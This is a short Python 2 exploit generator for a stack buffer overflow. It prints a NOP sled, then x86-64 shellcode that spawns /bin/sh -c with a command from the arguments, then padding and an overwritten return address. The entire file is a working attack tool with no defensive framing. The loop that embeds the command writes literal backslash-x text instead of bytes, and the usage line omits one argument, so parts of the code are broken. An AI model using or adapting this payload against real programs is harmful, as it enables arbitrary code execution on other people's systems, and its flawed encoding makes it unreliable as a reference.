#! /usr/bin/python2
import sys


if len(sys.argv)==5:
	address=sys.argv[1].decode("hex")
	address=address[::-1]
	padding_size = int(sys.argv[2])
	nop_size = int (sys.argv[3])
	execute = sys.argv[4].encode("hex")
else:
	print "Usage:", sys.argv[0], "address padding_size nop_size" 
	sys.exit(1)

shellcode="\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48" \
+ "\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66\x68\x2d\x63\x54\x5b\x48" \
+ "\x31\xc9\x51\xeb\x11\x5a\x52\x80\x72\x05\x41\x53\x57\x54\x5e\x48\x31" \
+ "\xd2\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff"

for i in execute:
	shellcode += ("\\x" + i)

shellcode += "\x41"

print "\x90" * nop_size + shellcode + "A" * (padding_size-nop_size) + address
